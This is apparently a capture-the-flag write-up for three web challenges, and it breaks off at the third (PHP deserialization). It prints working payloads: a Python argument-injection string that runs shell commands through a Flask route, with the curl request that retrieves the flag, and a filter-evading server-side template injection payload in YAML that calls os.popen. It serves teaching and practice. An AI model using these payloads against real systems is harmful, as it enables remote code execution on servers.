--------------

### HACKCON CTF 

----------------

![image](https://github.com/user-attachments/assets/2a3fdfd1-c616-4f65-9554-b4e9018fe752)

----------------

### Challenges-:

----------------

- Web-:
  - Processed Subscription
  - Flask ain't no markup language
  - Zeezy's notes

------------------

### Web

------------------

### Processed Subscription

------------------

![image](https://github.com/user-attachments/assets/edee15aa-4195-4a00-aa61-bb9f8c605ead)

------------------

- Source code analysis, code-:

```python
@app.route('/run_file', methods=['GET'])
def run_code():
    filename = request.args.get("code")
    if filename.endswith(".py"):
       response = subprocess.Popen(["python3",filename],stdout=-1).communicate()
       response =  response[0].decode()
       print(response)
    else:
        response = "Invalid file type"
    return jsonify({'result': response})
```
- The route `run_file` is vulnerable to argument injection.An attacker can control the filename variable and trigger `argument injection` to Remote Code Exection on the server.
- Testing it on a python interpreter before triggering it on the server.

![image](https://github.com/user-attachments/assets/104066ba-c520-4d52-aa79-4a9613c00ccc)

- Normally, Python should only execute a file in this state and should not be vulnerable to `argument injection`.
- Explaining the payload-:

```python3
-c\neval(\"__import__('os').system('id')\")
```

- The `-c` switch triggers the python interpreter, then we use `\n` to slip to the next line.Then, in the next line, we activate our payload.If we try it with the python interpreter, it'll be something like this.

![image](https://github.com/user-attachments/assets/f3f2a683-94ad-4c3e-9a4d-84e2480f27a4)

- Final Payload-:
```
-c%0aeval(\"__import__(\'os\').system('cat%20flag.txt')\")%23.py
```

- Flag-: ```gdscCTF{l0l_tw34k1ng_withSubpr0c3ss}```

```zsh
curl -G https://chall1.pxxl.xyz/run_file -d "code=-c%0aeval(\"__import__(\'os\').system('cat%20flag.txt')\")%23.py"
{"result":"gdscCTF{l0l_tw34k1ng_withSubpr0c3ss}\n"}
```

----------------

### Flask ain't no Markup Language

---------------

![image](https://github.com/user-attachments/assets/5fa6bf38-41f2-42f1-9866-0447c27c6504)

---------------

- Vulnerability is Flask Server Side Template Injection in `yaml`.While executing it, our payload will be place in yaml syntax e.g

```yaml
x: "{{7*7}}"
```

![image](https://github.com/user-attachments/assets/e4fd1bf4-85f5-4ce6-bfb4-ed18a3112ce40)


- Final payload-:

```
x: "{{config.__init__.__globals__.__getitem__('__BUILTINS__'.lower()).__getitem__('__IMPORT__'.lower())('OS'.lower()).popen('base64 /app/fl??/*.txt | base64 -d').read()}}"
```

- You can bypass the filtered strings by setting it to uppercase and passing it to python's lower function as soon as it is parsed.Lastly. the word `flag` gets filtered which you can bypass with regex e.g `fl?? should match flag`.
- Flag-: ```gdscCTF{4c4dae5677c29dcdcd06ba88565602fa}```

![image](https://github.com/user-attachments/assets/9bb1bb33-8913-4bf3-be94-5e2f4796dfe5)

----------------

### Zeezy's notes

-----------------

![image](https://github.com/user-attachments/assets/4c5c3982-9e3b-49ac-8c9c-e83fccba294e)

-----------------

- Vulnerability-: Php Insecure Deserialization(Privesc to Remote Code Execution)

------------------

### Source Code Analysis (Privilege Escalation)

------------------

- 



